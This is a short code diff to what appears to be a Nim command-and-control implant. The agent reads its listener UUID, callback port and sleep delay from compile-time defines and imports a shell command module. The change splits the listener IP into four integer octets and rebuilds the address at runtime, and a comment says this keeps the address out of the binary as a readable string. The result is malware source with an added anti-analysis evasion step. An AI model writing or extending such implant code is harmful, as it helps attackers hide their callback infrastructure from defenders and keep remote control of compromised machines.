@@ -5,7 +5,10 @@ import ./[types, http, task]
 import commands/shell
 
 const ListenerUuid {.strdefine.}: string = ""
-const ListenerIp {.strdefine.}: string = ""
+const Octet1 {.intdefine.}: int = 0
+const Octet2 {.intdefine.}: int = 0
+const Octet3 {.intdefine.}: int = 0
+const Octet4 {.intdefine.}: int = 0
 const ListenerPort {.intdefine.}: int = 5555
 const SleepDelay {.intdefine.}: int = 10
 
@@ -22,13 +25,16 @@ proc main() =
     # The agent configuration is read at compile time using define/-d statements in nim.cfg
     # This configuration file can be dynamically generated from the teamserver management interface
     # Downside to this is obviously that readable strings, such as the listener UUID can be found in the binary
-    when not defined(ListenerUuid) or not defined(ListenerIp) or not defined(ListenerPort) or not defined(SleepDelay):
+    when not defined(ListenerUuid) or not defined(Octet1) or not defined(Octet2) or not defined(Octet3) or not defined(Octet4) or not defined(ListenerPort) or not defined(SleepDelay):
         echo "Missing agent configuration."
         quit(0)
 
+    # Reconstruct IP address, which is split into integers to prevent it from showing up as a hardcoded-string in the binary
+    let address = $Octet1 & "." & $Octet2 & "." & $Octet3 & "." & $Octet4 
+
     var config = AgentConfig(
         listener: ListenerUuid,
-        ip: ListenerIp, 
+        ip: address, 
         port: ListenerPort, 
         sleep: SleepDelay
     )
